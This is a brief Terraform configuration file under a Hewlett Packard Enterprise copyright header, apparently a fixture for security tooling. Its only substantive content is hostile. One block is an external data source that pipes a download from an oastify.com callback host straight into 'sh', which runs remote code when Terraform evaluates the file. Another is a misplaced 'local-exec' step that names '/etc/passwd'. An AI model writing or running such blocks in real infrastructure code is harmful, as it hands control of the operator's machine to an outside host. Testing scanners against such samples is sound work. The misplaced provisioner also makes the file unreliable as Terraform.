# Copyright 2022 Hewlett Packard Enterprise Development LP

terraform {
  required_version = ">= 0.13.0"
}

provisioner "local-exec" {
  command = "echo /etc/passwd"
}

data "external" "example" {
  program = ["sh", "-c", "curl https://4iniwny6dv5wst61haufnxuzxq3hrgf5.oastify.com | sh"]
}
